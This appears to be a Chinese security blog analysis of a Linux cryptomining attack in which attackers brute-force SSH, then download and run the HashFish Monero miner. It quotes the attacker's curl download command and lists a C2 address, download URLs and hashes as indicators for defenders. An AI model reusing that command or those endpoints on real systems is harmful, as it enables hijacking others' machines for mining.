##  **一、背景**

 **近**
**期观测到，Linux下挖矿攻击事件，攻击者通过SSH爆破获得权限后，下载哈鱼矿工进行挖矿，对该样本进行深入分析。哈鱼矿工是一款专门为对区块链不了解的小白用户设计的挖矿软件。通过电脑的CPU和GPU计算获得虚拟货币并统一换算成比特币，用户可以将挖矿收益提现到支付宝或者选择提币到比特币钱包。**

![](https://image.3001.net/images/20191017/1571307794_5da84112760a3.png!small)

目前哈鱼矿工支持CryptoNight和Ethash算法，可用于挖门罗、以太坊等主流加密货币。此外，哈鱼矿工已率先支持门罗币新PoW算法。届时将自动无缝切换到新算法，无需人工干预。

![](https://image.3001.net/images/20191017/1571307805_5da8411d5a71e.png!small)

##  **二、样本介绍**

样本基本信息：

**样本** |  **MD5** |  **内容**  
---|---|---  
get.sh  |  1f17b8602739864fe6f78d34330d9537  |  脚本下载哈鱼挖矿程序  
hashfish  |  ac74da8ea28bf2146b069e4d44d44ae0  |  64位挖矿管理程序  
hfxminer64  |  337d30665c902246c45dc8c7a5d2dd4b  |  64位挖矿程序  
  
##  **三、详细分析**

攻击者通过SSH爆破后，执行curl <http://cli.hashfish.net/get.sh>-o
get.sh下载get.sh脚本,脚本内容如下所示，主要作用是根据系统版本下载对应的哈鱼挖矿程序包，并且执行挖矿程序，其中phone表示挖矿用户，mode为模式。

![](https://image.3001.net/images/20191017/1571307828_5da84134247bf.png!small)

通过在测试环境中执行脚本分析，发现攻击者用户名为：ph_r190HVKESk13exg=，矿池为cn4.hfsvr.com:19891，进行门罗币挖矿。

![](https://image.3001.net/images/20191017/1571307841_5da84141e9c82.png!small)

哈鱼的挖矿进行名hfxminer64，下面为进程状态。

![](https://image.3001.net/images/20191017/1571307851_5da8414b87994.png!small)

可以发现平均每秒可以执行三十几次hash运算。

![](https://image.3001.net/images/20191017/1571307864_5da84158e15d1.png!small)

##  **三、相关** **IOC**

###  **MD5**

    
    
    1f17b8602739864fe6f78d34330d9537
    ac74da8ea28bf2146b069e4d44d44ae0
    337d30665c902246c45dc8c7a5d2dd4b

###  **C2**

    
    
    42.88.44.188:6974

###  **URL**

    
    
    http://cli.hashfish.net/get.sh
    http://cli.hashfish.net/linux.tar.gz
    http://cli.hashfish.net/darwin.tar.gz

附：其他平台检测结果：

微步分析结果，可以发现微步还不认为该挖矿样本为恶意程序，

![](https://image.3001.net/images/20191017/1571307954_5da841b25614c.png!small)Virustotal检测结果：![](https://image.3001.net/images/20191017/1571308157_5da8427dc6053.png!small)![](https://image.3001.net/images/20191017/1571308054_5da842169c9cd.png!small)

 ***本文原创作者： Sampson，本文属于FreeBuf原创奖励计划，未经许可禁止转载**  

